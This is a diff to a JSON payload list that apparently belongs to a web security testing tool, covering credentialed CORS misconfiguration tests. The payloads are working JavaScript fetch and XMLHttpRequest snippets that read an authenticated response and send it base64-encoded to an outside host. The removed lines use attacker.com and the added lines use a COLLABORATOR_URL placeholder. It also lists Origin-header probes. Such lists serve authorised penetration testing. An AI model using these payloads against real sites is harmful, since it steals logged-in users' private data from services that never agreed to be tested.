@@ -45,10 +45,10 @@
     "credentialed_test": {
       "description": "Test credentialed CORS requests — Access-Control-Allow-Credentials: true with various origins",
       "payloads": [
-        {"payload": "fetch('TARGET_URL',{credentials:'include',mode:'cors'}).then(r=>r.text()).then(d=>new Image().src='https://attacker.com/log?d='+btoa(d))", "description": "JS fetch with credentials:include — exfiltrate response if ACAO reflects and ACAC:true", "waf_bypass": false},
+        {"payload": "fetch('TARGET_URL',{credentials:'include',mode:'cors'}).then(r=>r.text()).then(d=>new Image().src='https://COLLABORATOR_URL/log?d='+btoa(d))", "description": "JS fetch with credentials:include — exfil response to Collaborator if ACAO reflects and ACAC:true", "waf_bypass": false},
         {"payload": "Origin: https://attacker.com", "description": "Test if ACAO reflects origin AND ACAC:true — both needed for credential theft", "waf_bypass": false},
         {"payload": "Origin: null", "description": "Test if ACAO:null with ACAC:true — exploitable via sandboxed iframe", "waf_bypass": false},
-        {"payload": "var x=new XMLHttpRequest();x.open('GET','TARGET_URL');x.withCredentials=true;x.onload=function(){new Image().src='https://attacker.com/?d='+btoa(x.responseText)};x.send()", "description": "XHR with withCredentials=true — classic credentialed CORS exfil", "waf_bypass": false}
+        {"payload": "var x=new XMLHttpRequest();x.open('GET','TARGET_URL');x.withCredentials=true;x.onload=function(){new Image().src='https://COLLABORATOR_URL/?d='+btoa(x.responseText)};x.send()", "description": "XHR with withCredentials=true — classic credentialed CORS exfil to Collaborator", "waf_bypass": false}
       ]
     }
   }
